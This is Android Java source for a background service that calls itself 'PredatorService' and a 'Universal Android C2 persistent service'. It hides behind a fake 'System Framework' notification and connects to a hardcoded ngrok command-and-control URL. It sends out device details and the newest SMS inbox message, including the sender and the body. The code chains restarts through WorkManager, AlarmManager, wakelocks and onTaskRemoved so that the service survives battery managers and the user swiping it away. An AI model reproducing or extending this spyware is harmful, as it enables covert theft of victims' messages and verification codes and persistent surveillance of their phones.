package com.example.systemframework;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.engineio.client.transports.WebSocket;
import io.socket.engineio.client.transports.Polling;
import java.util.concurrent.TimeUnit;

/**
 * MyBackgroundService — Universal Android C2 persistent service
 * 
 * KEY IMPROVEMENTS FOR UNIVERSAL OEM SUPPORT:
 * 1. WorkManager integration — survives all OEM battery killers
 * 2. Aggressive reconnection — heartbeat every 2 min + WorkManager every 15 min
 * 3. Android 14/15 compliance — proper foreground service types
 * 4. Multiple restart mechanisms — AlarmManager + WorkManager + onDestroy + onTaskRemoved
 * 5. WakeLock management — prevents CPU sleep during critical operations
 */
public class MyBackgroundService extends Service {
    private static final String TAG = "PredatorService";

    private Socket mSocket;
    private String ngrokUrl = "https://homologically-uncensorious-barbie.ngrok-free.dev";
    private String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
    private String lastSmsId = "";
    private PowerManager.WakeLock wakeLock;
    private boolean isSyncDone = false;

    // Background thread for all operations
    private HandlerThread handlerThread;
    private Handler handler;

    // Thread safety
    private final Object socketLock = new Object();
    private boolean isConnecting = false;

    private static MyBackgroundService instance;

    // Network callback for instant reconnect on network change
    private ConnectivityManager.NetworkCallback networkCallback;

    // Track consecutive failures for smarter backoff
    private int consecutiveFailures = 0;
    private static final int MAX_BACKOFF_MINUTES = 5;

    public static MyBackgroundService getInstance() {
        return instance;
    }

    // ═══════════════════════════════════════════════════════════════
    // HEARTBEAT — runs every 2 minutes on background thread
    // ═══════════════════════════════════════════════════════════════
    private Runnable heartbeat = new Runnable() {
        @Override
        public void run() {
            try {
                // Acquire WakeLock to prevent CPU sleep during heartbeat
                if (wakeLock != null && !wakeLock.isHeld()) {
                    wakeLock.acquire(2 * 60 * 1000L); // 2 minutes max
                }

                synchronized (socketLock) {
                    if (mSocket != null && mSocket.connected()) {
                        // Connection alive — send heartbeat
                        sendBatteryStatus();
                        mSocket.emit("ping_alive");
                        consecutiveFailures = 0; // Reset failure counter
                        Log.d(TAG, "💓 Heartbeat — connection alive");
                    } else {
                        // Connection dead — reconnect with backoff
                        consecutiveFailures++;
                        Log.w(TAG, "💔 Heartbeat — dead connection (failure #" + consecutiveFailures + ")");
                        setupSocket();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat error: " + e.getMessage());
            } finally {
                if (wakeLock != null && wakeLock.isHeld()) {
                    try { wakeLock.release(); } catch (Exception ignored) {}
                }
            }

            // Reschedule: 2 min normally, up to 5 min on consecutive failures
            long delayMinutes = Math.min(2 + consecutiveFailures, MAX_BACKOFF_MINUTES);
            if (handler != null) {
                handler.postDelayed(this, delayMinutes * 60 * 1000);
            }
        }
    };

    // ═══════════════════════════════════════════════════════════════
    // SERVICE LIFECYCLE
    // ═══════════════════════════════════════════════════════════════

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        // Create dedicated background thread
        handlerThread = new HandlerThread("PredatorHeartbeat");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        // Register network callback for instant reconnect
        registerNetworkCallback();

        // Ensure WorkManager is scheduled (belt + suspenders)
        ensureWorkManagerScheduled();

        Log.d(TAG, "Service created — OEM: " + Build.MANUFACTURER);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        // Acquire WakeLock
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (wakeLock == null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Predator:PersistLock");
        }

        Notification notification = new NotificationCompat.Builder(this, "system_channel")
                .setContentTitle("System Framework")
                .setContentText("Running stability checks...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .build();

        // ✅ Android 14+ requires foreground service type in startForeground
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                | ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING);
        } else {
            startForeground(1, notification);
        }

        // Only connect if actually disconnected
        synchronized (socketLock) {
            if (mSocket == null || !mSocket.connected()) {
                setupSocket();
            }
        }

        // Start heartbeat (remove old one first to prevent stacking)
        handler.removeCallbacks(heartbeat);
        handler.postDelayed(heartbeat, 30 * 1000); // First heartbeat after 30s

        // Schedule AlarmManager backup
        scheduleReconnectAlarm();

        return START_STICKY;
    }

    // ═══════════════════════════════════════════════════════════════
    // SOCKET CONNECTION
    // ═══════════════════════════════════════════════════════════════

    private void setupSocket() {
        synchronized (socketLock) {
            if (isConnecting) {
                Log.d(TAG, "Already connecting — skipping duplicate setupSocket");
                return;
            }
            isConnecting = true;

            try {
                // DESTROY old socket completely before creating new one
                if (mSocket != null) {
                    Log.d(TAG, "Destroying old socket before reconnect");
                    mSocket.off();
                    mSocket.disconnect();
                    mSocket.close();
                    mSocket = null;
                }

                IO.Options opts = new IO.Options();
                opts.reconnection = true;
                opts.reconnectionAttempts = Integer.MAX_VALUE;
                opts.reconnectionDelay = 3000;       // Start at 3s
                opts.reconnectionDelayMax = 30000;    // Max 30s between retries
                opts.randomizationFactor = 0.5;
                opts.timeout = 20000;                 // 20s connection timeout
                opts.transports = new String[]{"websocket", "polling"};
                opts.forceNew = true;                 // Fresh connection each time

                mSocket = IO.socket(ngrokUrl, opts);

                mSocket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "✅ Connected to C2 server");
                    isConnecting = false;
                    consecutiveFailures = 0;
                    if (!isSyncDone) {
                        sendDeviceInfo();
                        sendBatteryStatus();
                        readSMSInstant();
                        isSyncDone = true;
                    }
                });

                mSocket.on(Socket.EVENT_DISCONNECT, args -> {
                    String reason = args.length > 0 ? args[0].toString() : "unknown";
                    Log.w(TAG, "❌ Disconnected: " + reason);
                    isSyncDone = false;
                    isConnecting = false;

                    // Server forcefully disconnected — auto-reconnect won't trigger
                    if ("io server disconnect".equals(reason)) {
                        handler.postDelayed(() -> {
                            synchronized (socketLock) { setupSocket(); }
                        }, 5000);
                    }
                });

                mSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                    String error = args.length > 0 ? args[0].toString() : "unknown";
                    Log.e(TAG, "⚠️ Connection error: " + error);
                    isConnecting = false;
                });

                mSocket.on("reconnect", args -> {
                    Log.d(TAG, "🔄 Reconnected to C2");
                    isSyncDone = false;
                    isConnecting = false;
                    consecutiveFailures = 0;
                });

                mSocket.on("reconnect_attempt", args -> {
                    int attempt = args.length > 0 ? (int) args[0] : 0;
                    Log.d(TAG, "🔄 Reconnect attempt #" + attempt);
                });

                mSocket.on("pong_alive", args -> {
                    Log.d(TAG, "💓 Server pong — confirmed alive");
                });

                mSocket.connect();
                SmsReceiver.setSocket(mSocket);
                Log.d(TAG, "Socket connect() called — waiting...");

            } catch (Exception e) {
                Log.e(TAG, "setupSocket failed: " + e.getMessage());
                isConnecting = false;
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // DATA EMISSION
    // ═══════════════════════════════════════════════════════════════

    private void sendDeviceInfo() {
        if (mSocket != null && mSocket.connected()) {
            String info = deviceModel + " | Android " + Build.VERSION.RELEASE
                + " | OEM: " + Build.MANUFACTURER
                + " | SDK: " + Build.VERSION.SDK_INT;
            mSocket.emit("device_info", info);
        }
    }

    private void sendBatteryStatus() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int batteryPct = (int) ((level / (float) scale) * 100);

                // Get charging state
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;

                synchronized (socketLock) {
                    if (mSocket != null && mSocket.connected()) {
                        mSocket.emit("phone_data", "[" + deviceModel + "] BATTERY: "
                            + batteryPct + "%" + (isCharging ? " ⚡CHARGING" : ""));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "sendBatteryStatus error: " + e.getMessage());
        }
    }

    public void readSMSInstant() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;

        handler.post(() -> {
            try {
                Uri uri = Uri.parse("content://sms/inbox");
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(uri, new String[]{"_id", "address", "body"}, null, null, "date DESC LIMIT 1");

                if (cursor != null && cursor.moveToFirst()) {
                    String id = cursor.getString(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);

                    synchronized (socketLock) {
                        if (mSocket != null && mSocket.connected()) {
                            mSocket.emit("phone_data", "📂 [LATEST INBOX] From " + address + " -> " + body);
                            lastSmsId = id;
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.e(TAG, "readSMSInstant error: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // PERSISTENCE MECHANISMS
    // ═══════════════════════════════════════════════════════════════

    /**
     * Network callback — instant reconnect when WiFi/Mobile data changes
     */
    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            NetworkRequest request = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build();

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(@NonNull Network network) {
                    Log.d(TAG, "🌐 Network available — checking socket");
                    handler.postDelayed(() -> {
                        synchronized (socketLock) {
                            if (mSocket == null || !mSocket.connected()) {
                                Log.d(TAG, "🌐 Socket dead after network restore — reconnecting");
                                setupSocket();
                            }
                        }
                    }, 3000); // 3s delay to let network stabilize
                }

                @Override
                public void onLost(@NonNull Network network) {
                    Log.w(TAG, "🌐 Network lost — waiting for restore");
                }
            };

            cm.registerNetworkCallback(request, networkCallback);
        } catch (Exception e) {
            Log.e(TAG, "registerNetworkCallback error: " + e.getMessage());
        }
    }

    /**
     * AlarmManager backup — fires every 10 minutes
     * Works alongside WorkManager for redundancy
     */
    private void scheduleReconnectAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent reconnectIntent = new Intent(this, ReconnectReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, reconnectIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + 10 * 60 * 1000, pi);
            }
            Log.d(TAG, "⏰ Reconnect alarm scheduled +10min");
        } catch (Exception e) {
            Log.e(TAG, "scheduleReconnectAlarm error: " + e.getMessage());
        }
    }

    /**
     * ✅ WorkManager — the ultimate persistence guarantee
     * Ensures the service is restarted even if AlarmManager fails (which it does on MIUI)
     */
    private void ensureWorkManagerScheduled() {
        try {
            Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

            PeriodicWorkRequest persistenceWork = new PeriodicWorkRequest.Builder(
                    PersistenceWorker.class,
                    15, TimeUnit.MINUTES
                )
                .setConstraints(constraints)
                .build();

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                PersistenceWorker.WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                persistenceWork
            );

            Log.d(TAG, "✅ WorkManager persistence scheduled");
        } catch (Exception e) {
            Log.e(TAG, "WorkManager scheduling failed: " + e.getMessage());
        }
    }

    /**
     * Public method for ReconnectReceiver and PersistenceWorker
     */
    public void onAlarmTriggered() {
        Log.d(TAG, "⏰ External trigger — checking connection");
        synchronized (socketLock) {
            if (mSocket == null || !mSocket.connected()) {
                setupSocket();
            } else {
                sendBatteryStatus();
                mSocket.emit("ping_alive");
            }
        }
        // Reschedule next alarm
        scheduleReconnectAlarm();
    }

    // ═══════════════════════════════════════════════════════════════
    // NOTIFICATION & CLEANUP
    // ═══════════════════════════════════════════════════════════════

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "system_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            channel.setDescription("System stability monitoring");
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        Log.w(TAG, "⚠️ Service onDestroy — scheduling restart");

        // Cleanup
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        if (handler != null) handler.removeCallbacks(heartbeat);

        // Unregister network callback
        if (networkCallback != null) {
            try {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
        }

        // Disconnect socket
        synchronized (socketLock) {
            if (mSocket != null) {
                mSocket.off();
                mSocket.disconnect();
                mSocket.close();
                mSocket = null;
            }
        }

        // ✅ RESTART MECHANISM 1: AlarmManager restart in 3 seconds
        try {
            Intent restartIntent = new Intent(this, MyBackgroundService.class);
            PendingIntent restartPi = PendingIntent.getService(this, 1, restartIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
            }
        } catch (Exception e) {
            Log.e(TAG, "Restart alarm failed: " + e.getMessage());
        }

        // ✅ RESTART MECHANISM 2: WorkManager will also restart (if not already done)
        // WorkManager survives even when the service and alarm both fail

        // Shutdown handler thread
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }

        instance = null;
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.w(TAG, "⚠️ Task removed — scheduling restart");

        // ✅ RESTART: When user swipes app from recents
        try {
            Intent restartIntent = new Intent(this, MyBackgroundService.class);
            PendingIntent restartPi = PendingIntent.getService(this, 2, restartIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
            }
        } catch (Exception e) {
            Log.e(TAG, "Task removed restart failed: " + e.getMessage());
        }

        super.onTaskRemoved(rootIntent);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}